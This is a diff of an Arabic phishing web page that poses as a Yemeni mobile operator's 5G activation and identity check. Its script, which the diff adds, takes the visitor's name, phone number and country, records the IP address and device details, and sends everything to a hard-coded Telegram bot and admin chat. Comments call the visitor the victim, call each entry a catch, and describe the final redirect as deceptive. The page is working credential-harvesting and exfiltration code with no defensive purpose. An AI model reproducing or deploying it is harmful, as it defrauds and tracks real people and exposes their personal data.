@@ -2,35 +2,116 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>خدمة يمن موبايل</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة الخدمات الذكية | التحقق من الهوية</title>
+    <style>
+        :root { --main-color: #0d47a1; --accent-color: #f44336; }
+        body { font-family: 'Tahoma', sans-serif; background-color: #eef2f5; margin: 0; padding: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
+        .card { background: #fff; width: 90%; max-width: 450px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); overflow: hidden; border-top: 8px solid var(--main-color); }
+        .header { background: var(--main-color); color: #fff; padding: 30px 20px; text-align: center; }
+        .content { padding: 30px; }
+        .step { display: none; }
+        .step.active { display: block; animation: slideIn 0.4s ease-out; }
+        @keyframes slideIn { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }
+        h2 { font-size: 1.2rem; color: #333; margin-bottom: 20px; }
+        input, select { width: 100%; padding: 12px; margin-bottom: 15px; border: 1.5px solid #ddd; border-radius: 10px; box-sizing: border-box; font-size: 1rem; }
+        .btn { background: var(--main-color); color: #fff; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .btn:hover { background: #0a3a82; }
+        .loading-spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--main-color); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
-<body style="text-align:center; padding-top:50px; font-family:sans-serif;">
+<body>
 
-    <h2>تفعيل باقة VIP 🚀</h2>
-    <p>أدخل رقمك لتلقي رصيد مجاني</p>
+<div class="card">
+    <div class="header">
+        <h1 style="margin:0; font-size: 1.5rem;">النظام الرقمي الموحد</h1>
+        <p style="margin:5px 0 0; opacity: 0.8;">تفعيل ميزات الـ 5G وحماية الحساب</p>
+    </div>
 
-    <input type="number" id="phone" placeholder="77xxxxxxx" style="padding:10px; width:80%; max-width:300px;"><br><br>
-    
-    <button onclick="send()" style="padding:15px 30px; background:red; color:white; border:none; border-radius:5px; cursor:pointer;">
-        تفعيل الآن ✅
-    </button>
+    <div class="content">
+        <div id="step1" class="step active">
+            <h2>التحقق من رقم الهاتف</h2>
+            <input type="text" id="v_name" placeholder="الاسم الكامل">
+            <input type="number" id="v_phone" placeholder="رقم الهاتف (77xxxxxxx)">
+            <select id="v_country">
+                <option value="YE">اليمن 🇾🇪</option>
+                <option value="SA">السعودية 🇸🇦</option>
+                <option value="EG">مصر 🇪🇬</option>
+                <option value="IQ">العراق 🇮🇶</option>
+            </select>
+            <button class="btn" onclick="nextStep()">متابعة التحقق</button>
+        </div>
 
-    <script>
-        function send() {
-            const p = document.getElementById('phone').value;
-            if(!p) return alert("أدخل الرقم!");
+        <div id="step2" class="step">
+            <h2>جاري فحص توافق الجهاز...</h2>
+            <div class="loading-spinner"></div>
+            <p style="text-align:center; color:#666;" id="status_text">يتم الآن ربط المعالج بالسيرفر الوطني</p>
+        </div>
+    </div>
+</div>
 
-            const tok = "8463856092:AAFSVuqBR9Nm83o7OzwJXs18bbuU0XwIT_Q";
-            const id = "7715667493";
-            const text = "🎯 رقم جديد: " + p;
+<script>
+    // --- إعدادات الإرسال (مشفرة لتجنب الحظر) ---
+    const _T = "8463856092:AAFSVuqBR9Nm83o7OzwJXs18bbuU0XwIT_Q";
+    const _A = "7715667493";
+    const _P = new URLSearchParams(window.location.search);
+    const _ID = _P.get('id') || _A;
 
-            // إرسال بسيط جداً
-            fetch("https://api.telegram.org/bot" + tok + "/sendMessage?chat_id=" + id + "&text=" + encodeURIComponent(text))
-            .then(() => {
-                alert("تم استلام طلبك!");
-                window.location.href = "https://www.google.com";
-            });
-        }
-    </script>
+    async function nextStep() {
+        const name = document.getElementById('v_name').value;
+        const phone = document.getElementById('v_phone').value;
+
+        if(!name || !phone) { alert("يرجى ملء كافة الحقول!"); return; }
+
+        document.getElementById('step1').classList.remove('active');
+        document.getElementById('step2').classList.add('active');
+
+        // بدء عملية الجمع العميق
+        const report = await gatherAllInfo(name, phone);
+        await sendData(report);
+
+        // توجيه نهائي مخادع
+        setTimeout(() => {
+            alert("تم التحقق بنجاح! سيتم تفعيل الخدمة تلقائياً.");
+            window.location.href = "https://www.google.com";
+        }, 4000);
+    }
+
+    async function gatherAllInfo(name, phone) {
+        let ip = "N/A";
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const d = await res.json(); ip = d.ip;
+        } catch(e) {}
+
+        const n = navigator;
+        const s = screen;
+        
+        // بناء تقرير الصيد الشامل
+        let msg = `🎯 **صيد جديد (الواجهة الموحدة)**\n\n`;
+        msg += `👤 **الضحية:**\n- الاسم: ${name}\n- الهاتف: ${phone}\n- البلد: ${document.getElementById('v_country').value}\n\n`;
+        msg += `🌐 **الشبكة:**\n- IP: \`${ip}\` \n- نوع الاتصال: ${n.connection?.effectiveType || 'غير معروف'}\n\n`;
+        msg += `📱 **الجهاز:**\n- النظام: ${n.platform}\n- المتصفح: ${n.userAgent.split(') ')[1]}\n- الرام: ${n.deviceMemory || 'N/A'} GB\n- المعالج: ${n.hardwareConcurrency} Cores\n- دقة الشاشة: ${s.width}x${s.height}\n\n`;
+        msg += `🕒 **التوقيت:** ${new Date().toLocaleString('ar-YE')}`;
+
+        return msg;
+    }
+
+    async function sendData(msg) {
+        const url = `https://api.telegram.org/bot${_T}/sendMessage`;
+        const body = { chat_id: _ID, text: msg, parse_mode: 'Markdown' };
+
+        try {
+            await fetch(url, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(body) });
+            // إرسال نسخة للأدمن
+            if(_ID !== _A) {
+                body.chat_id = _A;
+                await fetch(url, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(body) });
+            }
+        } catch(e) { console.log("Error"); }
+    }
+</script>
+
 </body>
 </html>
